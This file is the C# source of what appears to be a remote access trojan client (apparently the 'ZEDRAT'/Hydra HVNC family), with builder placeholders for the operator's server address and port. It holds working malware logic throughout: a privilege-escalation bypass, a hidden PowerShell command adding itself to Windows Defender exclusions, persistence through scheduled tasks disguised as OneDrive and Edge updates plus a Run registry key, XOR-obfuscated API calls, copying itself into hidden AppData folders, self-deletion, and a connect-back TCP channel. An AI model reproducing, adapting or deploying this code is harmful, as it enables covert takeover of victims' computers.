using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Client.Hydra.Hvnc;
using Client.Properties;
using Client.ZEDRAT.Helper;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Microsoft.Win32;

namespace Client
{
	internal static class Program
	{
		public static TcpServer m_tcpServer = null;

		public static string m_strServerAddr = "%IP%";

		private static int m_nPort = Convert.ToInt32("%Port%");

		public static string Aspida = "%Aspida%";

		public static string AlphaOmega = "%AlphaOmega%";

		public static string Ekinhsh = "%Ekinhsh%";

		public static string USB = "%USB%";

		public static string Egkatastash = "%Egkatastash%";

		public static string FakelosEgkat = "true";

		public static string OnomaArxeiou = "true";

		public static string Exclude = "%Exclude%";

		public static string Yphresia = "%Yphresia%";

		public static string TheWatcher = "%TheWatcher%";

		public static string MTX = "gieq/l+NK3F4Oa/ohifLQmkmw035t1pU3pDkPrKSNK1hM5ol17nDE6xDdLCXbFmoLgEkw5vZh9kcMcVVPgjPUQ==";

		public static string Prostaths = "%Prostaths%";

		public static string Delay = "%Delay%";

		public static string DelayNum = "%DelayNum%";

		private static readonly string[] referencedAssemblies = new string[9] { "System.dll", "System.Management.dll", "System.Windows.Forms.dll", "System.Drawing.dll", "Microsoft.VisualBasic.dll", "System.Reflection.dll", "System.Threading.dll", "System.Threading.Tasks.dll", "System.Security.Principal.dll" };

		[STAThread]
		private static void Main(string[] args)
		{
			if (Regex.IsMatch(Program.AlphaOmega, "true") && !new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				Sucks.suck(Process.GetCurrentProcess().MainModule.FileName);
			}
			if (Regex.IsMatch(Program.TheWatcher, "true"))
			{
				string pathm = Path.GetTempPath();
				CompilerParameters compilerParameters = new CompilerParameters(Program.referencedAssemblies);
				compilerParameters.IncludeDebugInformation = false;
				compilerParameters.CompilerOptions = " /target:winexe /platform:anycpu /optimize+";
				compilerParameters.OutputAssembly = Path.Combine(pathm, "SMSvcHoists.exe");
				string zeus = Resources.zeus;
				string fileName = Process.GetCurrentProcess().MainModule.FileName;
				string newValue = Process.GetCurrentProcess().Id.ToString();
				zeus = zeus.Replace("%NAME%", Program.OnomaArxeiou).Replace("%PATH%", fileName).Replace("%PID%", newValue);
				foreach (CompilerError error in new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", "v4.0" } }).CompileAssemblyFromSource(compilerParameters, zeus).Errors)
				{
					MessageBox.Show(error.ToString());
				}
				if (Information.UBound(Process.GetProcessesByName("SMSvcHoists")) < 0)
				{
					new Thread((ThreadStart)delegate
					{
						Process.Start(new ProcessStartInfo
						{
							FileName = "cmd",
							Arguments = "/k start /b " + Path.Combine(pathm, "SMSvcHoists.exe  & exit"),
							CreateNoWindow = true,
							WindowStyle = ProcessWindowStyle.Hidden,
							UseShellExecute = true,
							ErrorDialog = false
						});
					}).Start();
				}
			}
			if (Regex.IsMatch(Program.Aspida, "true"))
			{
				Ektelesths.Run();
			}
			if (Regex.IsMatch(Program.Ekinhsh, "true"))
			{
				Program.sthnEkinhsh();
			}
			if (Regex.IsMatch(Program.Exclude, "true"))
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd",
					Arguments = "/k start /b powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath " + Process.GetCurrentProcess().MainModule.FileName + " & exit",
					CreateNoWindow = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = true,
					ErrorDialog = false
				});
			}
			if (Regex.IsMatch(Program.Yphresia, "true"))
			{
				string location = Assembly.GetExecutingAssembly().Location;
				string text = Path.Combine(Path.GetTempPath(), Program.OnomaArxeiou + ".exe");
				try
				{
					if (!File.Exists(text))
					{
						File.Copy(location, text);
					}
				}
				catch
				{
				}
				string environmentVariable = Environment.GetEnvironmentVariable("SYSTEMROOT/tasks");
				string name = WindowsIdentity.GetCurrent().Name;
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "cmd";
				processStartInfo.Arguments = "/k start /b powershell Cacls \"" + environmentVariable + "\" /e /t /g \"" + name + "\":F  & exit";
				processStartInfo.CreateNoWindow = true;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.UseShellExecute = true;
				processStartInfo.ErrorDialog = false;
				Process.Start(processStartInfo);
				string text2 = "OneDrive Standalone Update Task-S-1-5-21-6666668628-324293029-2081181062-1001";
				try
				{
					processStartInfo = new ProcessStartInfo("schtasks");
					processStartInfo.Arguments = "/create /tn \"" + text2 + "\" /sc ONLOGON /tr \"" + text + "\" /rl HIGHEST /f";
					processStartInfo.UseShellExecute = false;
					processStartInfo.CreateNoWindow = true;
					Process.Start(processStartInfo).WaitForExit(1000);
				}
				catch (Exception)
				{
				}
			}
			if (Regex.IsMatch(Program.Delay, "true"))
			{
				Thread.Sleep(Convert.ToInt32(Program.DelayNum));
			}
			try
			{
				Application.EnableVisualStyles();
				Application.SetCompatibleTextRenderingDefault(defaultValue: false);
				AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(HandleUnhandledException);
				string[] command = Program.GetCommand();
				new Exec();
				if (command.Length == 2)
				{
					if (command[1].Equals("u"))
					{
						Thread.Sleep(2000);
						Program.CheckTcpServer();
					}
					else
					{
						Program.CheckExeName(command[1]);
						Program.Exec(Program.CreateMyFile(), "u", 0);
						Process.GetCurrentProcess().Kill();
					}
				}
				else if (Program.Mutex())
				{
					Program.CheckTcpServer();
				}
			}
			catch
			{
				Process.GetCurrentProcess().Kill();
			}
		}

		public static bool sthnEkinhsh()
		{
			string text = "Edge";
			string location = Assembly.GetExecutingAssembly().Location;
			if (Program.IsAdmin())
			{
				try
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo("schtasks");
					processStartInfo.Arguments = "/create /tn \"" + text + "\" /sc ONLOGON /tr \"" + location + "\" /rl HIGHEST /f";
					processStartInfo.UseShellExecute = false;
					processStartInfo.CreateNoWindow = true;
					Process process = Process.Start(processStartInfo);
					process.WaitForExit(1000);
					if (process.ExitCode == 0)
					{
						return true;
					}
				}
				catch (Exception)
				{
				}
				return RegKHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", text, location, addQuotes: true);
			}
			return RegKHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", text, location, addQuotes: true);
		}

		public static bool IsAdmin()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		public static void CheckExeName(string name)
		{
			try
			{
				string[] files = Directory.GetFiles(Path.GetDirectoryName(name));
				foreach (string text in files)
				{
					if (text.Contains(".exe") && !text.Equals(name))
					{
						if (text.Equals("jinzhou.exe"))
						{
							Program.WinExec(text, null, "runas");
						}
						else
						{
							Program.WinExec(text, null, null);
						}
						Program.DeleteItselfByCmd(name);
					}
				}
			}
			catch
			{
			}
		}

		private static void DeleteItselfByCmd(string FileName)
		{
			Process.Start(new ProcessStartInfo("cmd.exe", "/C ping 127.1 -n 2 > nul & del /f /s /q " + FileName)
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			});
		}

		public static void WinExec(string FileName, string Argument, string Verb)
		{
			Process.Start(new ProcessStartInfo
			{
				CreateNoWindow = true,
				Arguments = Argument,
				FileName = FileName,
				Verb = Verb
			});
		}

		public static void CheckTcpServer()
		{
			if (Program.m_tcpServer == null)
			{
				Program.m_tcpServer = new TcpServer(Program.m_strServerAddr, Program.m_nPort);
			}
		}

		public static bool Mutex()
		{
			try
			{
				if (Program.OpenMutexA(2031617u, bInheritHandle: true, "ppgod") != IntPtr.Zero)
				{
					Process.GetCurrentProcess().Kill();
				}
				return Program.CreateMutexA(IntPtr.Zero, bInitialOwner: true, "ppgod") != IntPtr.Zero;
			}
			catch
			{
				return false;
			}
		}

		public static string[] GetCommand()
		{
			try
			{
				return Type.GetType(Program.BCutEncrypt("Ysy~og$Od|cxedgod~")).InvokeMember(Program.BCutEncrypt("Mo~IeggkdnFcdoKxmy"), BindingFlags.InvokeMethod, null, null, null) as string[];
			}
			catch
			{
				return null;
			}
		}

		public static void Exec(string path, string parameter, object show)
		{
			try
			{
				Type typeFromCLSID = Type.GetTypeFromCLSID(new Guid(Program.BCutEncrypt("3HK:?3=8'L<K2';;IL'K>>8'::K:I3:K2L93")));
				object obj = typeFromCLSID.InvokeMember(target: Activator.CreateInstance(typeFromCLSID), name: Program.BCutEncrypt("c~og"), invokeAttr: BindingFlags.InvokeMethod, binder: null, args: null);
				object obj2 = obj.GetType().InvokeMember(Program.BCutEncrypt("Nei\u007fgod~"), BindingFlags.GetProperty, null, obj, null);
				object obj3 = obj2.GetType().InvokeMember(Program.BCutEncrypt("Kzzfcik~ced"), BindingFlags.GetProperty, null, obj2, null);
				obj3.GetType().InvokeMember(Program.BCutEncrypt("YboffOroi\u007f~o"), BindingFlags.InvokeMethod, null, obj3, new object[5] { path, parameter, "", null, show });
			}
			catch
			{
			}
		}

		public static string CreateMyFile()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string text = Path.Combine(folderPath, Program.BCutEncrypt("IegY|iIedlcm$oro"));
			string destFileName = text + ".config";
			try
			{
				Directory.CreateDirectory(folderPath);
				FileAttributes attributes = File.GetAttributes(folderPath);
				File.SetAttributes(folderPath, attributes | FileAttributes.Hidden);
				File.SetAttributes(folderPath, attributes | FileAttributes.System);
				File.Copy(Process.GetCurrentProcess().MainModule.FileName, text);
				File.Copy(Process.GetCurrentProcess().MainModule.FileName + ".config", destFileName);
				return text;
			}
			catch
			{
				return text;
			}
		}

		public static uint h(string str)
		{
			uint num = 0u;
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				num = num * 30 + array[i];
			}
			return num;
		}

		private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
		{
			Process.GetCurrentProcess().Kill();
		}

		private static string GetPCandUser()
		{
			try
			{
				return Environment.MachineName;
			}
			catch
			{
				return Program.BCutEncrypt("_dade}d");
			}
		}

		private static string BCutEncrypt(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				stringBuilder.Append((char)(array[i] ^ c));
			}
			return stringBuilder.ToString();
		}

		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenMutexA(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, [In][MarshalAs(UnmanagedType.LPStr)] string lpName);

		[DllImport("kernel32.dll")]
		public static extern IntPtr CreateMutexA([In] IntPtr lpMutexAttributes, [MarshalAs(UnmanagedType.Bool)] bool bInitialOwner, [In][MarshalAs(UnmanagedType.LPStr)] string lpName);
	}
}
